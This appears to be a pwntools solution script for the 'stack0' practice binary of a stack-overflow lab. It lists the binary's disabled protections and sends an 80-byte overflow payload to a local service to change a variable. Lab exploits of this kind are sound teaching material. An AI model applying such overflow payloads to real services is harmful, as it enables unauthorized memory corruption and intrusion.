from pwn import *

# 1. info
context.log_level = 'debug'
e = ELF("../stack0")

"""
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
"""

# 2. connect
p = remote('127.0.0.1', 60001)

# 3. exploit
payload = b'a' * 80
p.sendline(payload)

# 4. get flag
message = p.recvline()
FLAG = b"you have changed the 'modified' variable"
if FLAG in message:
    print(FLAG)